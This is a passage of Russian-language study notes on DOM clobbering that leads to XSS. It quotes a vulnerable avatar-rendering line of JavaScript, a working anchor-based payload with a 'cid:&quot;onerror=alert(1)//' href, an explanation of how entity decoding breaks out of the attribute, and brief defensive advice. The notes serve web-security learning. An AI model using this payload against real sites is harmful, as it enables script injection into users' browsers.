let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';

Payload:
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

{avatar: ‘cid:"onerror=alert(1)//’}
```

> Назначение: Каждая часть сообщения (например, вложение в письме, картинка в HTML-письме) может иметь уникальный идентификатор, заданный в заголовке Content-ID. Чтобы сослаться на эту часть внутри самого сообщения (например, чтобы показать картинку в теле письма), используется ссылка cid:<идентификатор>.
> Аналог: Это очень похоже на то, как на веб-странице вы используете #some-id для ссылки на элемент с id="some-id", но для частей MIME-сообщения.

* Двойное декодирование: Браузер, встречая ссылку cid:&quot;onerror=alert(1)//, делает следующее:
    * Он парсит HTML и видит значение атрибута href="cid:&quot;onerror=alert(1)//".
    * Символ &quot; является HTML-сущностью. Браузер декодирует его в настоящую двойную кавычку " во время построения DOM.
 
# **Защита**

* Не допускать, чтобы данные из любого ненадежного источника динамически изменяли значение, передаваемое в любой приемник.
* Проверить на основе белого списка, разрешая только заведомо безопасный контент.
* Может потребоваться сочетание экранирования JavaScript, кодирования HTML и кодирования URL в соответствующей последовательности.

# **URL**

* https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-clobbering.html
* https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-xss.html
* https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html
